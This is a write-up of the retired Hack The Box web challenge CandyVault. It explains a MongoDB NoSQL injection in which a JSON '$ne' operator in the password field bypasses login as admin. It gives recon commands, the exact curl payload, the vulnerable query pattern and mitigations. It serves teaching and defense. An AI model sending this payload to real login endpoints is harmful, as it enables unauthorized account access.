---
challenge: CandyVault
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nosql, mongodb, authentication-bypass]
---

# CandyVault — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flag.

## TL;DR

A candy store login sends credentials as JSON objects. The backend passes them directly to a MongoDB query, so a `$ne` operator bypasses the password comparison and logs in as administrator.

## Prompt and surface

- Web, Easy, retired.
- A store with registration, login and an admin panel.
- The goal is to reach the panel and read the flag.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/login
```

## Reconnaissance

```bash
ffuf -u http://<IP>:<PORT>/FUZZ -w <WORDLIST>
curl -s http://<IP>:<PORT>/api/products
```

- The application is Node.js/Express.
- Login accepts `application/json`.
- Errors distinguish a missing user from a wrong password.

## Root cause

The server does something equivalent to:

```js
db.users.findOne({ username: req.body.username, password: req.body.password })
```

If `req.body.password` is an object, Mongo interprets operators such as `$ne`, `$gt` or `$regex` instead of comparing a string. The type is not validated before the query.

## Exploitation

```bash
curl -s http://<IP>:<PORT>/api/login -H 'Content-Type: application/json'   --data '{"username":"admin","password":{"$ne":"x"}}'
```

The response contains a session or token. Use it to visit the panel and locate the flag, which is not published.

## Evidence

- Valid login with a password that is not the real one.
- Response with an administrator role.
- Panel access and flag read.

## Lessons

- NoSQL does not mean no injection.
- Data type is part of validation.
- Error messages help enumerate users.
- A JSON operator can completely change the query.

## Mitigations and detection

- Cast fields to strings and validate the schema.
- Use strongly typed queries and `$eq`.
- Return generic login errors and add rate limiting.
- Alert on JSON bodies with keys starting with `$`.
- References: OWASP NoSQL Injection, MongoDB operators.

## References

- <https://www.hackthebox.com/challenges/CandyVault>
- <https://owasp.org/www-community/attacks/NoSQL_Injection>
- <https://www.mongodb.com/docs/manual/reference/operator/query/ne/>
- <https://attack.mitre.org/techniques/T1190/>
